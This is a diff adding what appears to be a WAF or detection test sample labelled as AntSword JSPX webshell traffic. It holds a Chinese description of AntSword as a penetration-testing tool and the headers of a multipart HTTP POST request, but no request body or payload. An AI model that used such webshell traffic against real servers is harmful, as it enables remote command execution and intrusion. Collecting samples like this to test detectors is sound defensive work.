@@ -1,0 +1,10 @@
+# webshell_AntSword_jspx_Defineclass
+# AntSword 是一个功能强大的跨平台 Web 渗透测试平台，具有可扩展性、易用性和高效性。它为渗透测试人员提供了一个集成的环境，用于执行各种 Web 渗透测试任务，包括查找漏洞、利用漏洞、获取系统信息、执行命令、上传/下载文件等。
+POST /?bid=hd_tag_m8mv24gd HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24gd
+RM-PRO-Token: 765e881f27ebab4153f011cd85604423
+RM-PRO-Time: 1742808380672
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=nQsYxtntWnICjgJyyWYyR3opzOweq9bp
+
